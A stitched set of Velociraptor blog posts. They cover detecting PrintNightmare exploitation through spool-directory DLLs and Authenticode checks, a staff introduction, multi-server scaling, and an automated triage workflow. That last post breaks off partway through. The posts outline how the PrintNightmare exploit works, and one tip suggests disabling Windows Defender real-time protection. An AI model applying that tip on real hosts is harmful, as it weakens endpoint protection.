In the next part of this article series we will be examining more
examples of utilizing ETW for enhancing end point visibility and
facilitating advanced response. We will also be discussing limitations
with this technique.

If you have a great idea for a new detection query, take [Velociraptor
for a spin](https://github.com/Velocidex/velociraptor)! It is a
available on GitHub under an open source license. As always please
file issues on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

There is still time to submit it to this year's [2021 Velociraptor
Contributor
Competition](https://docs.velociraptor.app/announcements/2021-artifact-contest/),
where you can win prizes, honor and support the entire DFIR
community. Alternatively, you can share your artifacts with the community on
[Velociraptor's Artifact
Exchange](https://docs.velociraptor.app/exchange/).

---END OF FILE---

======
FILE: /content/blog/2021/2021-07-12-velociraptor-vs-printnightmare/_index.md
======
---
title: "Velociraptor vs Printnightmare"
description: |
  This post walks through a common use case for Velociraptor’s VQL:
  detecting exploitation of a new zero day (A newly announced
  vulnerability without a patch available). Once a zero day has been
  announced, time is of the essence! Defenders must scramble to
  determine possible remediations and detect exploitation on their
  network.
tags:
- Detection
- VQL
date: 2021-07-11T18:13:50Z
author: Matthew Green and Mike Cohen
weight: 20
---

## Hunting a Zero day!

Velociraptor is an advanced open source endpoint visibility framework
based on a flexible query language called
[VQL](https://docs.velociraptor.app/docs/vql/). What makes
Velociraptor unique from other endpoint tools is the flexibility to
develop new queries to address emerging threats.

This post walks through a common use case for Velociraptor’s VQL:
detecting exploitation of a new zero day (A newly announced
vulnerability without a patch available). Once a zero day has been
announced, time is of the essence! Defenders must scramble to
determine possible remediations and detect exploitation on their
network.

This is when Velociraptor’s quick and flexible approach shines: As
defenders we can develop a query to detect past exploitation of the
vulnerability, ensure hardening or patching has been applied to
prevent future exploitation. Additionally, Velociraptor provides a
mechanism for ongoing real-time monitoring using VQL queries,
therefore allowing us to use it for real time detection or future
attacks.

## Background

On the 29th of June a POC exploit for a critical vulnerability was
accidentally released by a researcher that targeted the Microsoft
Print Spooler service. The “PrintNightmare” vulnerability
(CVE-2021-[1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)/[34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) ), could be used to remotely compromise a Windows
system with SYSTEM privileges. While a patch was initially released
during the June 8 patch cycle, security researchers quickly discovered
it was incomplete and exploitation was still available on fully
patched windows hosts.

At this time, we wanted to rapidly develop a VQL query that would
indicate if any endpoint had been exploited through this vector. Our
first task was to learn more about the issue and particularly try to
understand what Digital Forensic artifacts were left behind on the
system after a successful exploitation attempt.

While many other researchers were focusing solely on windows event
logs, Velociraptor provides access to many more forensically
significant artifacts, because it is running on the endpoint. This
allows us to explore a richer and more accurate set of artifacts in
order to detect exploitation attempts.



## Exploitation

We will first begin by replicating the issue using a couple of the
open source POC exploits. For our testing we used the MimiKatz
PrintNightmare capability and a local privilege escalation powershell
POC available here.


![Mimikatz PrintNightmare](image9.png)



![Invoke-Nightmare - LPE POC](image2.png)

An excellent walk through of the vulnerability can be found [here](https://www.kb.cert.org/vuls/id/383432) and
[here](https://www.rapid7.com/blog/post/2021/06/30/cve-2021-1675-printnightmare-patch-does-not-remediate-vulnerability/), but what does the exploit actually do?

1. Attackers connect to the Print Spooler Service by sending a request to add a printer using a windows API (AddPrinterDriverEx) over SMB, or RPC.

![](image7.png)

2. When installing a new “print driver” the attacker can configure several module paths and configuration inside pDriverContainer and these paths are copied to the print spool folder during installation.

![Invoke-Nightmare: powershell is easy to read.](image1.png)

3. Some of the POC variations copied files in slightly different ways but each ended up with an attacker controlled module being executed by the spoolsv.exe as a driver datafile, enabling the Remote Code Execution or Local Privilege Elevation.

We can use Procmon to see what files were modified on the system.


![Procmon: Mimikatz PrinterNightmare exploitation. Payload mimilib.dll](image3.png)

So a successful exploit results in the copying of a new dll into the
spool directory and the dll being loaded by the spoolsv.exe service
process.

### Detecting new files in the spool directory.

As a first iteration, let's use Velociraptor to recursively list all
the binaries in the spool/drivers directory. We can use the regular OS
APIs to list the directory, but in our case we will scan the entire
filesystem by parsing the NTFS internal structures (Analysis of the
NTFS may even reveal presently deleted files).

![](image4.png)

The above query parses the entire master file table (MFT) and returns
information about those files in the spool directory.


![PE listing in Windows\System32\spool\drivers**](image6.png)

While the proof of concept malicious drivers are immediately
recognizable by name (mimilib.dll and nightmare.dll) we don't want to
rely on name alone since that is easily changed by a real
attacker. Let’s add to this query some more information about the
executable file itself, such as PE attributes (like export table,
import tables) hashes and specifically, if the file is signed or not
(i.e. its authenticode signature verification). An [example query](https://gist.github.com/scudette/e24c32528b4aee679209b688afa40839) is shown below.

![](image12.png)

The additional information about any modules found is critical in
allowing analysts to quickly discount legitimate binaries and speed up
the triage process.


![Mimikatz payload: PE attributes and authenticode](image10.png)

In the example above, we can see the Mimikatz exploit loads the
mimikatz DLL into the spools directory. The DLL is easily recognizable
by its authenticode signature which in most environments would
immediately designate it as suspicious.

We can also view obvious malicious PE exports or similarly, an absence
of print function related imports as a good signal that the binary is
not a legitimate printer driver. Finally time based filters for the
time period of exposure can be used as data points for potential
exploitation.

The Mimikatz POC loaded a signed component, but many other exploits
will load an unsigned binary. A binary with an untrusted Authenticode
signature is a valuable data point in detecting malicious code. See
[this previous post](https://docs.velociraptor.app/blog/2021/2021-06-09-verifying-executables-on-windows-1b3518122d3c/) for information on Authenticode. Below we see the
dll loaded by the second exploit POC we tried, based on powershell.


![PrintNightmare payload: PE attributes and authenticode](image13.png)

Because Velociraptor is running on the endpoint, its Authenticode
verification code can verify catalog based signatures. Most Microsoft
authored print drivers are signed via catalogs - meaning there is no
authenticode signature section in the file itself! One has to verify
the hash in a system wide hash “catalog” file, itself signed by the
developer.

Many binary classification services are not able to verify catalog
signatures, therefore displaying the file as unsigned. This can be
confusing for analysts who can not quickly triage the file as
legitimate. The below screenshot shows a VirusTotal search for a
legitimate Microsoft print driver. Although the file is not detected
as malicious, it is not shown as signed either.

![](image5.png)

![mxdwdrv.dll: not by verified signature - VirusTotal trusted tag by hash](image8.png)

All original Microsoft printer drivers are trusted and properly signed
via catalog, as shown by Velociraptor. Note that Velociraptor is also
able to indicate who signed the respective catalog file.


![mxdwdrv.dll: validated Authenticode signature by catalog](image11.png)


## Conclusions

In this post we developed a VQL artifact to detect exploited systems
by searching for residual printer drivers in the spools directory. We
enriched our detection using Authenticode signature verification, file
timestamps, file hashes and PE attributes (like the import/export
table) to quickly determine which drivers were legitimate and which
could indicate past exploitation.

We can collect this information from the entire Velociraptor fleet in
minutes by simply running a “hunt” over the deployment.

We have uploaded our query and a version to monitor print driver creation in the form of a VQL artifact to the
Velociraptor [“Artifact Exchange”](https://docs.velociraptor.app/exchange/) - a central place for the community
to share Velociraptor artifacts. This saves time for other
Velociraptor users, who can simply reuse our work and quickly hunt the
artifact across their entire deployment to determine if they were
previously exploited by this vulnerability.

If you would like to try hunting for this indicator, take Velociraptor
for a spin! It is available on [GitHub](https://github.com/Velocidex/velociraptor) under an open source license. As
always, please file issues on the bug tracker or ask questions on our
mailing list velociraptor-discuss@googlegroups.com. You can also chat
with us directly on discord at https://www.velocidex.com/discord

---END OF FILE---

======
FILE: /content/blog/2021/2021-09-17-carlos-intro/_index.md
======
---
title: "Welcome to Velociraptor, Carlos"
description: |
    Carlos Canto joins Velociraptor as its new Community Manager.  Read on to learn more.

tags:
 - Release

author: "Carlos Canto"
date: 2021-09-17
---
Hello Velociraptor Community!

My name is Carlos Canto and I have recently joined Rapid7 as the Community Engagement Manager for Velociraptor.  You may be wondering what that means.  In a nutshell, my job will be to increase awareness of the Velociraptor project and increase engagement among its users and contributors.  Expect to hear from me a lot in the coming weeks as I begin to get my feet wet in all things DFIR.  That includes blog posts, emails, social media content and other special events.  Our very own digital paleontologist, Mike Cohen, will continue to provide his regular updates and insight as well.  In short, we want to make the Velociraptor Community an engaging and rewarding place for everyone involved, but that means we’ll need participation from **YOU** as well.

You may be wondering what my deal is.  So a little bit about me… I have over 10 years experience managing communities of various forms including those in several fields such as investor services, software & hardware testing, and crowdsourcing.  I’ve met a lot of great people and have learned a ton along the way, so I hope to bring as much of that experience as I possibly can to this role as well.

But what makes Carlos tick? Well, when I'm not engaging with our amazing VR contributors, you can usually find me at home spending time with my family. I've had the honor of being married to my lovely wife for the last 13 years and we've been blessed with two amazing children. They keep me busy, that’s for sure, but I wouldn't trade it away for anything in the world.  When I have some free time you can usually find me doing one of the following: watching football, drinking craft beer, mountain biking and playing video games with my kids, not necessarily in that order.  

Enough about me.  What I really want is to hear from **YOU**!  Remember, this Community doesn’t thrive without active participation from all our contributors.  Make your voice heard!  Participate in the comments section of the blog.  If a particular article or post really speaks to you, let us know what you think.  If you haven’t already, follow us on Twitter (@velocidex).  Let us know what’s working, what’s not.  Share your cool, if only half-baked thoughts -- those sometimes end up being the best kind.  We’ll be creating official LinkedIn and Facebook pages as well (details to come).

Finally, don’t ever hesitate to reach out to me and let me know what’s on your mind.  I can be reached at carlos_canto@rapid7.com or by tweeting **@velocidex**.  Additionally, if you have any support or technical questions, you can email velociraptor-discuss@googlegroups.com and we’ll aim to get back to you ASAP.

I can’t wait to begin working with all of you!  


Keep digging!
Carlos

---END OF FILE---

======
FILE: /content/blog/2021/2021-04-29-scaling-velociraptor-57acc4df76ed/_index.md
======
---
title: Scaling Velociraptor
description: Velociraptor is an endpoint visibility tool designed to query a large number of endpoints quickly and efficiently. This post introduces the new experimental multi-server architecture that is released in the 0.5.9 release.
tags:
- Server
- Scalability
- Velociraptor
date: 2021-04-29
---

## Hunting at scale

![](../../img/0Y8UjXi9oQPXRRSsz.jpeg)

Velociraptor is an endpoint visibility tool designed to query a large number of endpoints quickly and efficiently. In previous releases, Velociraptor was restricted to a single server performing all functions, such as serving the GUI, the gRPC API as well as connections to the clients (endpoint agents). While this architecture is regularly used to serve up to 10k-15k endpoints, at high number of endpoints, we are starting to hit limitations with the single server model.

This post introduces the new experimental multi-server architecture that is released in the 0.5.9 release.

### What are the bottlenecks of scale?

If you have ever used Velociraptor on a small network of endpoints (say between 2k-5k endpoints), you would be accustomed to a snappy GUI, with the ability to query any of the currently connected endpoints instantly. Velociraptor clients typically do not poll, but are constantly connected to the server— this means that when tasking a new collection on an endpoint, we expect it to respond instantly.

As the number of endpoints increase this performance degrades. When forwarding a large number of events from the end points, or performing hunt that transfer a lot of data, one might experience sluggish performance.

However, Velociraptor is designed to operate reliably even under loaded conditions. Velociraptor maintains server stability under load by employing a number of limits:

1. Concurrency — This setting controls how many clients will be served at the same time. Typically clients upload their responses (JSON blobs or bulk file data) in HTTP POST up to 5mb in size. Since it takes a certain amount of memory to serve each client at the same time, without concurrency control it is difficult to control total server memory usage.

1. Load shedding — The server accepts client connections up to a certain rate (QPS limit). Above this rate, the server will refuse to connect, causing clients to back off and retry the connection later. This approach maintains server stability by spreading client uploads over time and capping the total client connections the server is seeing at each point in time.

1. Hunt client recruitment limits — Velociraptor limits the rate at which endpoints are assigned to a hunt (By default 100 per second). This therefore limits the rate at which responses come back and has the effect of spreading load over time.

These limits are designed to keep the server responsive and stable, but at high load they result in undesirable degradation of performance — in particular GUI performance suffers. Due to Golang’s fair scheduling algorithm, GUI requests are scheduled at the same priority as client requests — so as client number increases, the GUI become less responsive.

### Can we add more frontend servers?

The natural solution to the scale problem is to add more frontend servers, so that each frontend server handles a fraction of the clients. To understand what is required for a multi frontend design, let’s consider the main tasks of the frontend:

1. TLS encryption — Frontends need to encrypt and decrypt client communication using TLS. This is a CPU intensive operation (This cost can be limited to some extent by using TLS offloading), which will benefit from multiple servers.

1. Distribute new work for clients — Since clients are constantly connected we need a way to notify a given frontend that new work is available for a client. A client may be connected to any frontend server, so we need a good way to notify all servers there is new work.

1. Receive query results from clients — Each frontend needs to receive the results and store that in the backend storage solution. The results of a query may be a row-set (i.e. JSONL files) or bulk upload data. We need a good distributed storage solution that can be accessed by multiple servers.

1. Receive events from the client and potentially act on them — Clients can run monitoring queries, forwarding real time information about the endpoint. These events may trigger further processing on the server (e.g. upload to Elastic). We need a good way to replicate these events between servers.

### The datastore

Currently Velociraptor’s data store consists of flat files stored on the local disk. Since Velociraptor is primarily a collection tool, flat files work well. However, having files on the local disk means that it is impossible to share the datastore between multiple frontends running on different machines.

Previously, Velociraptor featured an experimental MySQL backend to store data. This solved the problem of distributing the data between frontends, by having all frontends connect to a central MySQL server. However, in practice the additional overheads introduced by the MySQL abstraction resulted in major performance degradation, and this data store was deprecated.

A more direct way to share files between multiple machines is via NFS or on AWS, [EFS](https://docs.aws.amazon.com/efs/latest/ug/how-it-works.html) (Google has a similar product called [Filestore](https://cloud.google.com/filestore)). This works very well and is a great fit for the Velociraptor data access pattern:

* Frontends always append to files, generally file data is not modified after writing (Think of a VQL Query results set — these are simple JSONL files that are written in chunks but never modified once written)

* The same file is never written by multiple frontends at the same time — each file exists within the client’s path and therefore is only accessed by one client at the time. Since a client is only connected to a single frontend, there is no need for complicated locking schemes.

The result is that Velociraptor’s data store is truly lock free, and therefore we do not need to worry about NFS file locking (which is often complicated or not implemented).

Additionally, cloud providers offer highly scalable NFS services with essentially unlimited storage and very high IO bandwidth. This makes it operationally easier to manage storage requirements (We often run out of disk space when using a fixed disk attached to a virtual machine). Additionally, EFS is changed per usage so it is easier to budget for it.

### Message passing

So if we simply run multiple frontends on different machines, load balance our clients to these frontends, and have all separate frontends simply write to the same shared NFS directory, this should work?

Not quite! Consider the following simple scenario, where multiple frontends are all sharing the same data store:

![](../../img/0gm3Boo6wDiHX4bDP)

The admin browser (on the left) is connected to the GUI on one frontend, and is tasking a new collection from a client which happened to be connected to another frontend (on the right). There is no way to tell that client there is new work for it. Remember that Velociraptor does not rely on polling, all clients are always connected and can be tasked immediately! So we really need a low latency mechanism to inform the client that new work is available.

In order to facilitate this there has to be a way for frontends to communicate with each other and pass messages with very low latency (i.e. we need a message passing architecture). The GUI needs to simply message all frontends that a new collection is scheduled for a particular client, and the one frontend which presently has that client connected will immediately task it.

### Multi frontend architecture

The latest release (0.5.9) features a multi frontend architecture. To simplify the message passing design, we designate one frontend as the **Master** and the other servers as the **Minions.** Velociraptor implements a simple steaming gRPC based **replication service** — replicating messages from each minion server to the master and from the master to all minion servers.

![](../../img/0cb6CiHW_m4COLHtf)

Minions receive events from the Master and generate events to send to the master, while the Master brokers all messages between minions. The Master node also runs the GUI and some other services, but the bulk of the client communication and collection is handled by the Minions.

Note that in this architecture, the GUI is running on a single frontend, and the number of clients handled by it can be reduced, keeping the GUI particularly responsive.

### Load balancing

In order to spread the load evenly between the multiple frontends, it is possible to use a load balancer in front of all the frontends.

As an alternative, it is possible to allow the Velociraptor clients themselves to load balance by providing multiple frontend URLs within the clients’ configuration. Clients will pick a frontend in random and rotate through the frontends randomly. This should result in relatively even distribution of clients between all the frontends.

### Current implementation

The upcoming 0.5.9 release uses command line arguments to control the type of frontend. By default a frontend will be started as a master, starting all services including the GUI in process. This is exactly the same behavior as the previous single frontend architecture so it should not affect existing users.

In order to allow minion frontends to connect one must:

1. Mount the EFS or NFS directory on both master and all minion servers adjusting the **Datastore.location** path in the configuration file if needed.

1. Add a new frontend using the **velociraptor config frontend** command

In order to start a minion frontend, one must specify the minion flag and the name of the node (the name consists of the dns name of the frontend followed by the port). The process is illustrated below.

![](../../img/1_rSIMZokO0O4i2SGfuep3w.png)

### Conclusions

The new architecture is still experimental but shows great promise to be able to scale Velociraptor to the next level. We need contributions from the community with polishing the new architecture and making it easier to deploy in wide deployment scenarios (for example Terraform templates, or docker files).

If you would like to contribute to this effort, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is a available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2021/2021-10-22-a-closer-look-at-the-winning-entry-in-the-2021-velociraptor-contributor-competition-575c387610af/_index.md
======
---
title: "A Closer Look at the Winning Entry in the 2021 Velociraptor Contributor Competition"
description: |
    We take a look under the hood of the Grand Prize Winner
tags:
 - Community

author: "Justin Welgemoed"
date: 2021-10-20
---

![](16AEbbSzNdpNFVHh0VnSEoA.jpeg)

On Friday October 9 the Velociraptor team crowned the grand prize winner in our 2021 Contributor Competition — unanimously won by Justin Welgemoed. His entry, “File Type Detection and Client-Server-Client Workflows” absolutely WOWed the judges. Want to learn more about Justin’s submission and how it takes Velociraptor to the next level? Read below for a deep dive into his work.

### 2021 Velociraptor Contributor Competition Entry:

## File Type Detection and Client-Server-Client Workflows

Currently most Velociraptor artifacts are written in such a way that they are self-contained and are therefore mostly useful in a standalone manner. In other words the common approach to artifact-writing tends to produce monolithic artifacts which typically have to:

1. do some kind of targeting logic

1. do something with the target files (if found)

1. do something with or about the results

The current approach results in a few downsides and inefficiencies:

* some artifacts end up being rather lengthy and difficult to understand at a glance.

* there is inevitably a lot of very similar or even duplicated logic across many artifacts.

* artifacts are heavily dependent of path specifications which makes them somewhat brittle and prone to missing filesystem targets which are not in the conventional locations. This also means that the current artifacts are mainly suited to the use case of “online” data due to the the heavy reliance on path specifications. Thus many Velociraptor artifacts (without modification) are usable only on “live/online” endpoints and will not work against “offline” data, for example data which has been collected through disk imaging or other collection methods.

## Goals

1. The first goal of this demonstration is to show that Velociraptor artifacts can implement client-server-client workflow automation, with decision logic being driven by the server-side in order to achieve a more dynamic/flexible and modular system of DFIR data collection. This also shows that Velociraptor can support reasonably complex workflows implemented *using only VQL*, rather than having to implement decision logic in an external application that interfaces via the Velociraptor API. In a nutshell: client artifacts and server artifacts can dance together. Client artifacts don’t have to do all the heavy lifting on their own. Server Monitoring artifacts are essentially server-based services that are an underutilized yet powerful component of Velociraptor.

2. The 2nd goal here is to demonstrate an approach that uses more concise and reusable Velociraptor artifacts. This is accomplished in 3 ways:

    a. by creating artifacts that each do a very specific thing, i.e. functional simplification which also increases reusability.

    b. by shifting some processing logic to the server side. In this way the processing logic can be spread across multiple artifacts.

    c. through use of Velociraptor features in the artifact definition and in the VQL plugins set which directly facilitate code reuse, mainly these ones:

## the Artifact() plugin

This allows Velociraptor artifacts to call other artifacts… which can then call other artifacts… and so on. With some careful planning this allows us to construct artifacts with branching logic to other (reusable) artifacts. This plugin also allows us to call a series of artifacts from one parent artifact, and perhaps have several layers of artifacts below the child artifact. This arrangement of logically related artifacts can amount to a sort of “playbook” where artifacts are invoked automatically rather than being run independently and manually.

Recently it [became possible](https://github.com/Velocidex/velociraptor/issues/1235#issuecomment-915721425) to use preconditions in artifacts that are called by other artifacts. This allows us to have artifacts that can adapt themselves to their environment or the data. In this demo we use that approach to have unified triage artifacts that will run equally well on Windows, Mac and Linux.

## export/imports

This [relatively new](https://github.com/Velocidex/velociraptor/pull/1087) feature allows artifacts to share blocks of code, including VQL, with other artifacts. Some of the current bundled artifacts are overloaded with huge reference lists and signature definitions. Artifacts such as these could benefit by having their weighty reference components allocated to dedicated artifacts which don’t have any VQL queries. These artifacts would then significantly cut down the size of some existing artifacts and again it is something that facilitates code-sharing across artifacts.

3. The 3rd goal is to demonstrate that artifacts can be easily created to support multiple platforms, as mentioned above. Although this demonstration targets Windows files it does not require that the processing be done *on* a Windows system. That means that it can also be used for “offline” processing of Windows files collected via external mechanisms (for example Kroll’s KAPE collection tool or disk images).

4. The 4th goal is to demonstrate a setup artifact that loads artifacts, tools and server monitoring tasks in 2 easy steps.

5. The 5th goal is to show that RawSec GENE is an excellent evtx triaging/analysis tool. I hope that more DFIR people start using it and support the tool’s author, [Quentin Jerome](https://github.com/qjerome), who has put years into it’s development and it’s sibling open-source DFIR tools that are very much under-appreciated.

![](0Ks_idnCHMco1SmfD.gif)

6. The sixth goal is demonstrating how the Velociraptor `starl()` function allows us to instantly add functionality to VQL. This amazing capability was contributed by Velociraptor community member [Clay Norris](https://github.com/clayscode).

## What we want Velociraptor to do

![](0emFBMgzFjONNrRTz.png)

* Locate evtx and exe files on the client based on file magic [("magic bytes")](https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance/?print=print) using Yara rather than using explicit file paths or file name
    - Artifact: Custom.Client.FindByMagics

* Have the Velociraptor server create a client-side flow to run [`GENE`](https://github.com/0xrawsec/gene) analysis against each evtx file.

* Have the Velociraptor server create a client-side flow to run [`CAPA`](https://github.com/fireeye/capa) analysis against each executable (pe32) file.
    * Artifact: `Custom.Server.DispatchTriage`
    * Artifact: `Custom.Client.TriageGene`
    * Artifact: `Custom.Client.TriageCapa`

* Have the server interpret the results and create more client-side flows to do something else in response to the triaging artifacts’ results. Perhaps upload these specific files back to the server to preserve evidence contained in them.
    * Artifact: `Custom.Server.DispatchUpload`
    * Artifact: `Custom.Client.TriageUpload`

* Bonus points: Hijacking the VFS browser “upload” function to allow us to kick off the above workflow from the VFS browser. 🤠
    * Artifact: `System.VFS.DownloadFile`

In a nutshell:
***We want to run a single artifact and then let Velociraptor decide what the next steps should be… and then iterate that process.***

Although this is a simplified and somewhat contrived example, it aims to demonstrate concepts rather than being a comprehensive real-world solution. It provides an example that can be expanded upon and repurposed quite easily.

## Step 0: Follow along on your own Velociraptor

### Artifact: [Temp.Setup.Demo](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Temp.Setup.Demo.yaml)

You can try this all on your own Velociraptor. You don’t have to do this but you might like to see it in action on your own server. *It’s probably not best to do this on a production server*, so if you don’t have a test server you can instantly set one up by running a local-mode Velociraptor (which is both the server and client) with the following command:

```
    velociraptor-v0.6.1-windows-amd64.exe gui
```

{{% notice note %}}
Please use the latest version: 0.6.1
{{% /notice %}}

There are a few simple steps to get the artifacts and tools set up on your server:

1. First step is to add the demo setup artifact — Temp.Setup.Demo - to your server's artifact repository.
To do that run this VQL in a Velociraptor notebook:

```vql
SELECT artifact_set(prefix="Temp.", definition=Content) AS LoadResponse FROM http_client(url="https://raw.githubusercontent.com/predictiple/VelociraptorCompetition/main/artifacts/Temp.Setup.Demo.yaml")
```

The result should looks something like this:

![](0mVKrLKiDNo2goSmo.png)

2. Then run the demo artifact which will:
    * install the other artifacts
    * download the tools to your server’s inventory, and
    * load the server monitoring artifacts.

Run this VQL this in a Velociraptor notebook to run the artifact (be aware that this one may take a minute or two because it downloads the tool binaries to your server):

```vql
SELECT * from Artifact.Temp.Setup.Demo()
```

The result should looks something like this (and the red text does not mean anything went wrong — it’s just logging information… in red 🤷):

![](0WTDSXnbi3EEJwsFy.png)

After it completes you can check that all the tools are loaded into the inventory by running this VQL query in a notebook:

```vql
SELECT * FROM inventory() WHERE name =~ 'gene' OR name =~ 'capa'
```

The tools in this repo are all the latest release versions from the author’s repositories. I have just unzipped and renamed them for convenience, but they can be downloaded from the original repos if you’re paranoid:

* GENE binaries: [https://github.com/0xrawsec/gene](https://github.com/0xrawsec/gene)

* GENE rules: [https://github.com/0xrawsec/gene-rules/blob/master/compiled.gen](https://github.com/0xrawsec/gene-rules/blob/master/compiled.gen)

* `CAPA` binaries: [https://github.com/fireeye/capa](https://github.com/fireeye/capa)

{{% notice tip %}}
For testing purposes you can also download some evtx files from [here](https://github.com/sans-blue-team/DeepBlueCLI) which contain events from simulated malicious activity.
{{% /notice %}}

Now we’re ready to go!
*Поехали!*

## Step 1: Locate interesting files based on file magics (using Yara)

### Artifact: [Custom.Client.FindByMagics](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Custom.Client.FindByMagics.yaml)

![](0T3ni2VWXKla2p4mN.png)

Our first adventure is locating files of interest without explicitly telling Velociraptor their locations or file names.

Sure we know that evtx files are supposed to all be in `C:\Windows\System32\winevt\logs`, but imagine a scenario that a server admin may have diligently saved some evtx files to his desktop while troubleshooting some unrelated issue 2 weeks ago, long before anyone even suspected that the server was compromised. Upon investigating you find that the server’s logs retain only about 2 days worth of events, making those saved logs on the admin’s desktop *extremely valuable!* Of course *you wouldn’t know* that the admin fortuitously did that and *he may not know* that there’s a security incident going on or that you even exist! So finding evidence in unexpected places can be pretty important. In this hypothetical scenario we could find these unexpected files using the fact that Windows evtx files have a known file magic: ElfFile. Such file magics (signatures) can easily be identified using Velociraptor's built-in Yara plugin and we'll use that fact in this demonstration.

For other files where the file magic is insufficient to identify the exact type of data — for example text logs which are all text and don’t have any file magic (although there are indirect ways to solve that problem) — we can do a deeper dive into the file content using additional Yara scans as another layer in the identification process, and thus resolve ambiguous file types into specific data types. In this way we can resolve more than just basic file magics: we can extend the concept to a more precise level of resolution which we can call “data types”. For example, we can disambiguate text logs into the specific data types of “Apache access log” vs. “Apache error log” vs. “Windows Defender log” using deeper levels of inspection. And we can do this without needing to know their file paths or file names! Awesome!

But for the purpose of keeping this demonstration as concise as possible we will only be dealing with evtx and exe files which are reliably and unambiguously identifiable using just file magics. Extending the identification to data types is an exercise left to the reader 😃 (and yes, this could also be done quite well with Velociraptor’s amazing [parse_binary](https://docs.velociraptor.app/vql_reference/parsers/#parse_binary) function)

In addition to freeing us up from the annoying dependency on path specifications, this approach also allows us to target files that have had their file extension changed or removed. As mentioned previously, having our targeting done independent of file paths and/or file names allows us to deal with the “offline data” use case more easily. And as a bonus it also makes things relatively platform-independent.


{{% notice note %}}
More fancy filtering could be implemented but we’re trying to keep it simple. The goal of this artifact is to identify relevant files and report back with their path. Subsequent artifacts could apply additional targeting logic based on things like timestamps or file content for example. In this case we are going to do more in-depth analysis with [GENE](https://github.com/0xrawsec/gene) and [`CAPA`](https://github.com/fireeye/capa) and use these tools to identify a subset of files that are more significant than the rest.
{{% /notice %}}


![](0KpOIdK2H4TRVxqQY.png)

We have embedded the 2 Yara rules inside the artifact parameters, however if we needed to use a more extensive list of Yara rules then would be impractical to put them inside the artifact definition. In that situation there are several alternatives:

1. store the rules in a separate file that could be added to the Velociraptor tool inventory and treated as a non-executable tool.

1. host a rules file on a web server and retrieve it on the client using the `http_client()` function.

1. store the rules in a dedicated artifact and export it using the [export/imports](https://github.com/Velocidex/velociraptor/pull/1087) feature. **This approach apparently doesn’t work when the exports section is in an artifact which is being called from another artifact using the Artifacts plugin, so it would not work if we called Custom.Client.FindByMagics from System.VFS.DownloadFile via the VFS browser GUI. I should probably log an issue about that...** *(note: this is fixed in [#1299](https://github.com/Velocidex/velociraptor/pull/1299), so it will be possible to do it this way starting from v0.6.2)* Anyway for that reason we have just kept it simple and embedded the 2 rules as an artifact parameter.

## Step 2: Have Velociraptor server decide what the client should do next

### Artifact: [`Custom.Server.DispatchTriage`](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Custom.Server.DispatchTriage.yaml)

![](0udXI_u4F2ICHqTpw.png)

The purpose of this artifact is to pair the files found by the FindByMagics artifact with the appropriate next step, i.e. the next artifact that needs to take action on the file. It’s essentially a patchboard between incoming file magic types and outgoing Velociraptor artifacts.

![](0CXp9HmOZ468aSyHI.png)

This artifact runs as a server-side monitoring artifact and listens for flow completions of our FindByMagics artifact. It retrieves the monitored artifact's results and pairs each result with a follow-up artifact. It then dispatches the follow-up artifact to the client using the `client_collect()` VQL function. To avoid dispatching a new client flow for every input file it compiles the list of target files into a list (for each type and accessor) and then dispatches a single artifact and passes the list and accessor to the artifact.

![](0XXPJV8BuU0Kz6_xT.png)

In order to achieve deduplication of the list of targets we have used Velociraptor’s `starl()` function which allows us to define a simple deduplicate function using Python code:

![](0HXqgoqyoIzZKbE4j.png)

[Starlark](https://github.com/google/starlark-go) is a dialect of Python. We’ve used it here because Velociraptor doesn’t currently have a function to deduplicate a list of values. So we’ve just given VQL a new capability, and it’s very cool to be able to that “on the fly” through the `starl()` function.

To make things configurable we have used artifact parameters for the list of monitored artifacts as well as for the item-level input->output pairing (“Response Mapping”). So you can add or remove monitored artifacts very easily without changing the artifact’s code.

You can also set up your own mappings of file magics -> response artifacts. One MagidID value can map to more than 1 dispatched artifact (one-to-many), so it is possible to have 2 or more types of analysis (via their own independent artifacts) run in response to a particular file type being identified. It’s also possible to have multiple MagicID values map to the same dispatched artifact (many-to-one), for example if the dispatched artifact performed some format-independent function such as uploading the target files to the server.

## Step 3: Send new orders to the client

### Artifact: [`Custom.Client.TriageGene`](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Custom.Client.TriageGene.yaml)

### Artifact: [`Custom.Client.TriageCapa`](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Custom.Client.TriageCapa.yaml)

These artifacts are probably not as good as they could be, but their main purpose is to illustrate that more in-depth analysis can be scheduled on a client based on the results of a previously run artifact. This process can be iterative and involve branching logic.

The key things to notice about these artifacts are:

1. They are multi-platform. So they can be run on the 3 main operating systems without OS-specific targeting. They can also work on “offline” data, where files from 1 operating system are being processed on a different operating system.

1. The tool definitions (“tools” section of the artifact) are as simple as possible because we’ve already defined and initialised (incl. downloading) the tools during the setup process. The tool definitions here are just to ensure that these tools are available to this artifact.

1. We don’t mess around with fancy-pants unzipping of tools in our artifact. Several of the Velociraptor-bundled artifacts download zipped tools from Github and then unzip them on the client. This is done for user-convenience but it creates unnecessary complexity in the artifact, plus we really shouldn’t be using tools in zips that have been pulled straight from Github. It’s better to download the tools, unzip the tools, test/validate the tools, and then store them in your Velociraptor’s inventory. This approach also means that your endpoints don’t need access to Github because all the tools will be pulled from the Velociraptor server.

1. We set the artifact parameters to “hidden” because we don’t intend these artifacts to be used standalone.

1. We give them a generous timeout because we could be targeting a large set of files that were previously collected and are now being analysed “offline”. Also `Capa` is written in Python and slow as molasses.

{{% notice note %}}
Windows Defender will probably prevent `Capa` from running. You may need to temporarily disable it’s realtime protection option or else add a realtime scanning exclusion for the folder your testing on.
{{% /notice %}}

## Step 4: Have Velociraptor server decide what the client should do next

